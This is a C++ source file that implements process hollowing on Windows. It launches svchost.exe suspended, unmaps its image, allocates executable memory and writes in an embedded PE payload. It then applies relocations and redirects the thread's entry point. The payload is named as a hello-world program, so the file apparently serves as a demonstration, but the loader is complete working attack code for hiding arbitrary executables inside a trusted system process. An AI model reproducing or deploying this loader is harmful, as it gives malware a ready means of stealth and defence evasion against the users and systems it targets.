#include <windows.h>
#include <iostream>
#include <winternl.h>
#include <string>
#include "../bin/HelloWorldHex.h" // Include the embedded helloWorldPayload array

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

// Structure to hold addresses in the target process
struct ProcessAddressInformation {
    LPVOID lpProcessPEBAddress;
    LPVOID lpProcessImageBaseAddress;
};

// Helper function to get the PEB address and ImageBaseAddress
ProcessAddressInformation GetProcessAddressInformation(HANDLE hProcess) {
    ProcessAddressInformation addressInfo = {nullptr, nullptr};

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "[error] Failed to get handle for ntdll.dll.\n";
        return addressInfo;
    }

    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        std::cerr << "[error] Failed to get NtQueryInformationProcess address.\n";
        return addressInfo;
    }

    PROCESS_BASIC_INFORMATION pbi;
    ULONG len;
    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &len) != 0) {
        std::cerr << "[error] Failed to get process basic information.\n";
        return addressInfo;
    }

    addressInfo.lpProcessPEBAddress = pbi.PebBaseAddress;

    // Read ImageBaseAddress from the PEB structure
    PVOID imageBaseAddress;
    SIZE_T bytesRead;
    if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBaseAddress, sizeof(PVOID), &bytesRead)) {
        std::cerr << "[error] Failed to read ImageBaseAddress from PEB.\n";
        return addressInfo;
    }

    addressInfo.lpProcessImageBaseAddress = imageBaseAddress;
    return addressInfo;
}



// Unmap the existing executable and allocate space for the new one
void UnmapAndAllocate(HANDLE hProcess, PVOID imageBase, size_t imageSize) {
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

    NtUnmapViewOfSection(hProcess, imageBase);
    VirtualAllocEx(hProcess, imageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
}

// Perform the process hollowing
bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
    auto* dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
    auto* ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uintptr_t>(dosHeader) + dosHeader->e_lfanew);

    // Retrieve base address from the target process
    ProcessAddressInformation addressInfo = GetProcessAddressInformation(hProcess);
    if (!addressInfo.lpProcessImageBaseAddress) {
        std::cerr << "[error] Failed to get process image base address.\n";
        return false;
    }

    // Unmap and allocate space in target process
    UnmapAndAllocate(hProcess, addressInfo.lpProcessImageBaseAddress, ntHeaders->OptionalHeader.SizeOfImage);

    // Copy headers
    WriteProcessMemory(hProcess, addressInfo.lpProcessImageBaseAddress, lpImage, ntHeaders->OptionalHeader.SizeOfHeaders, nullptr);

    // Copy sections
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders) + i;
        if (section->SizeOfRawData == 0) continue;

        LPVOID pRemoteSection = reinterpret_cast<PBYTE>(addressInfo.lpProcessImageBaseAddress) + section->VirtualAddress;
        LPVOID pLocalSection = reinterpret_cast<PBYTE>(lpImage) + section->PointerToRawData;
        WriteProcessMemory(hProcess, pRemoteSection, pLocalSection, section->SizeOfRawData, nullptr);
    }

    // Calculate delta for rebasing
    DWORD_PTR delta = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress) - ntHeaders->OptionalHeader.ImageBase;
    ntHeaders->OptionalHeader.ImageBase = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress);

    // Apply relocations if necessary
    if (delta != 0) {
        PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>((PBYTE)lpImage + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        while (reloc->VirtualAddress != 0) {
            DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            PWORD relocEntries = reinterpret_cast<PWORD>((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));

            for (DWORD i = 0; i < numEntries; i++) {
                if (relocEntries[i] == 0) continue;

                int type = relocEntries[i] >> 12;
                int offset = relocEntries[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    DWORD_PTR* patchAddr = reinterpret_cast<DWORD_PTR*>(reinterpret_cast<PBYTE>(addressInfo.lpProcessImageBaseAddress) + reloc->VirtualAddress + offset);

                    DWORD_PTR originalAddr;
                    ReadProcessMemory(hProcess, patchAddr, &originalAddr, sizeof(DWORD_PTR), nullptr);
                    DWORD_PTR newAddr = originalAddr + delta;
                    WriteProcessMemory(hProcess, patchAddr, &newAddr, sizeof(DWORD_PTR), nullptr);
                }
            }
            reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>((PBYTE)reloc + reloc->SizeOfBlock);
        }
    }

    // Set the thread context to start execution at the entry point
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);
#ifdef _WIN64
    ctx.Rip = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress) + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#else
    ctx.Eip = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress) + ntHeaders->OptionalHeader.AddressOfEntryPoint;
#endif
    SetThreadContext(hThread, &ctx);
    ResumeThread(hThread);

    return true;
}

int main() {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        std::cerr << "[error] Failed to create target process. Error: " << GetLastError() << "\n";
        return -1;
    }

    // Execute the process hollowing
    if (!RunPE(pi.hProcess, pi.hThread, hello_world_exe_exe, sizeof(hello_world_exe_exe))) {
        std::cerr << "[error] Process hollowing failed.\n";
        TerminateProcess(pi.hProcess, 0);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
